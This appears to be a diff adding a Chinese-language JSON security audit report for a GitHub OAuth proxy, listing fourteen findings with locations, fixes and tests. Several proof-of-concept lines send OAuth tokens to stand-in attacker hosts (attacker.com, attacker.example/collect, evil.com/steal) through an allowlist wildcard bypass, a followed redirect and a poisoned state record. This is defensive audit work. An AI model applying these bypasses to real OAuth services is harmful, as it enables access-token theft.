@@ -1,0 +1,169 @@
+{
+  "scan": "deep",
+  "target": "github_oauth_proxy",
+  "generated_at": "2026-09-26T15:35:00Z",
+  "findings": [
+    {
+      "id": "F-01",
+      "title": "白名单通配符跨越 host/path 边界，导致白名单绕过（OAuth access_token 外泄 / 开放重定向）",
+      "severity": "critical",
+      "confidence": "high",
+      "status": "fixed",
+      "validation": "validated",
+      "location": ["src/validation.ts:51-68", "src/validation.ts:88-120", "src/handlers/authorize.ts:144-145", "src/handlers/callback.ts:145", "src/deliver.ts:92"],
+      "attacker_input": "redirect_uri / success_redirect / error_redirect",
+      "sink": "deliverToBusinessServer -> fetch(target, body 含 token.access_token)",
+      "poc": "ALLOWED_CALLBACK_URIS=\"https://*.example.net/*\" + GET /authorize?redirect_uri=https://attacker.com/a.example.net/x",
+      "evidence": "修复前 isUrlAllowed=true，端到端返回 302；修复后 isUrlAllowed=false，端到端 400 redirect_uri_not_allowed",
+      "test": "test/security.test.ts > S-01",
+      "remediation": "按 origin 段 / path 段分别匹配；host 段通配 [^/:@]+，path 段 .*"
+    },
+    {
+      "id": "F-02",
+      "title": "CALLBACK_SIGNING_SECRET 缺少最小长度校验",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "fixed",
+      "validation": "validated",
+      "location": ["src/config.ts:97-110"],
+      "attacker_input": "部署配置（密钥熵）",
+      "sink": "src/deliver.ts:66 hmacSha256Hex(config.signingSecret, ...)",
+      "poc": "wrangler secret put CALLBACK_SIGNING_SECRET=x -> 修复前配置通过，修复后 server_misconfigured",
+      "test": "test/security.test.ts > S-02",
+      "remediation": "统一最小长度校验（签名密钥 >=32），并更正 README"
+    },
+    {
+      "id": "F-03",
+      "title": "/health?deep=1 未鉴权且无限流，可资源放大",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "fixed",
+      "validation": "validated",
+      "location": ["src/handlers/health.ts:76-100", "src/index.ts:134-136"],
+      "attacker_input": "HTTP 请求（无需鉴权）",
+      "sink": "kv.put(health:probe) + fetch(api.github.com/rate_limit)",
+      "poc": "并发大量 GET /health?deep=1",
+      "test": "test/security.test.ts > S-03",
+      "remediation": "仅对 deep 施加 KV 限流，超限 429 + Retry-After"
+    },
+    {
+      "id": "F-04",
+      "title": "回传业务服务器的出站请求跟随重定向",
+      "severity": "low",
+      "confidence": "medium",
+      "status": "fixed",
+      "validation": "validated",
+      "location": ["src/deliver.ts:79-90", "src/deliver.ts:92-108"],
+      "attacker_input": "白名单目标返回的 3xx（需目标被攻陷/误配）",
+      "sink": "fetch(..., redirect 默认 follow) 续发含 token 的请求",
+      "poc": "业务端点对 POST 返回 307 Location: https://attacker.example/collect",
+      "test": "test/security.test.ts > S-04",
+      "remediation": "两处 fetch 均设 redirect: 'error'"
+    },
+    {
+      "id": "F-05",
+      "title": "回调侧未对 state 记录中的 redirect_uri 二次校验",
+      "severity": "low",
+      "confidence": "high",
+      "status": "fixed",
+      "validation": "validated",
+      "location": ["src/handlers/callback.ts:77-96"],
+      "attacker_input": "被投毒的 KV state 记录（需 KV 写入面）",
+      "sink": "deliverToBusinessServer(record.redirect_uri)",
+      "poc": "构造 oauth:state:<nonce> 记录 redirect_uri=https://evil.com/steal",
+      "evidence": "修复前 503（先外呼 GitHub），修复后 400 redirect_uri_not_allowed 且零出站请求",
+      "test": "test/security.test.ts > S-05",
+      "remediation": "投递前 assertCallbackUriAllowed 二次校验"
+    },
+    {
+      "id": "F-06",
+      "title": "示例代码内置弱默认会话密钥 change-me",
+      "severity": "low",
+      "confidence": "high",
+      "status": "fixed",
+      "validation": "validated",
+      "location": ["examples/express-callback.mjs:44", "examples/flask-callback.py:29"],
+      "attacker_input": "整合方漏配 SESSION_SECRET",
+      "sink": "session 签名密钥退化为可预测值 -> 会话伪造",
+      "poc": "未设 SESSION_SECRET 时使用示例 -> 伪造会话 cookie",
+      "test": "n/a（示例代码，人工核对）",
+      "remediation": "缺失或 <32 时启动即抛错"
+    },
+    {
+      "id": "F-07",
+      "title": "?format=json 关闭 Cookie 绑定，回调仅依赖 KV nonce（理论 login-CSRF）",
+      "severity": "medium",
+      "confidence": "medium",
+      "status": "deferred",
+      "validation": "plausible-needs-integration",
+      "location": ["src/handlers/authorize.ts:167", "src/handlers/callback.ts:78-89"],
+      "attacker_input": "format=json + redirect_uri",
+      "sink": "callback 建立业务会话（依赖业务侧关联方式）",
+      "poc": "攻击者预取 nonce，诱导受害者访问 /callback?code=<attacker_code>&state=<nonce>",
+      "remediation": "需业务侧引入非 Cookie 的浏览器绑定（超出有界补丁范围）"
+    },
+    {
+      "id": "F-08",
+      "title": "限流键 IP 兜底信任 X-Real-IP / X-Forwarded-For",
+      "severity": "low",
+      "confidence": "medium",
+      "status": "deferred",
+      "location": ["src/ratelimit.ts:25-32"],
+      "remediation": "标准 CF 边缘注入不可伪造的 CF-Connecting-IP，生产不可达；已有「近似限流」声明"
+    },
+    {
+      "id": "F-09",
+      "title": "KV get-then-delete 非原子 + 最终一致，一次性 state 存在重放窗口",
+      "severity": "low",
+      "confidence": "medium",
+      "status": "deferred",
+      "location": ["src/state.ts:74-90"],
+      "remediation": "code 单次使用使重放无现实收益；已注释说明"
+    },
+    {
+      "id": "F-10",
+      "title": "production 下 JSON 错误分支仍回显 detail（缺失 secret 名称）",
+      "severity": "low",
+      "confidence": "high",
+      "status": "deferred",
+      "location": ["src/config.ts:86-95", "src/errors.ts:131-133", "src/responses.ts:116-117"],
+      "remediation": "与 HTML 分支不对称；仅泄露环境变量名，且现有测试固化该行为（可调试性），改动会变更对外契约"
+    },
+    {
+      "id": "F-11",
+      "title": "POST /authorize 在限流前解析完整 body 且无大小上限",
+      "severity": "low",
+      "confidence": "high",
+      "status": "deferred",
+      "location": ["src/handlers/authorize.ts:39-64", "src/handlers/authorize.ts:100-104"],
+      "remediation": "建议加 Content-Length 门限并把限流前置"
+    },
+    {
+      "id": "F-12",
+      "title": "DELIVERY_METHOD=GET 把 token + 签名放进 URL query",
+      "severity": "low",
+      "confidence": "high",
+      "status": "deferred",
+      "location": ["src/deliver.ts:74-90"],
+      "remediation": "非默认；建议移除该分支或仅联调启用"
+    },
+    {
+      "id": "F-13",
+      "title": "/authorize 失败路径反射未校验的原始 state 到 error_redirect",
+      "severity": "info",
+      "confidence": "medium",
+      "status": "deferred",
+      "location": ["src/handlers/authorize.ts:241"],
+      "remediation": "Proxy 侧已 URL 编码；风险取决于整合方渲染"
+    },
+    {
+      "id": "F-14",
+      "title": "HTML 响应缺少 CSP",
+      "severity": "info",
+      "confidence": "high",
+      "status": "deferred",
+      "location": ["src/responses.ts:9-15", "src/index.ts:72-80"],
+      "remediation": "纵深防御建议"
+    }
+  ]
+}
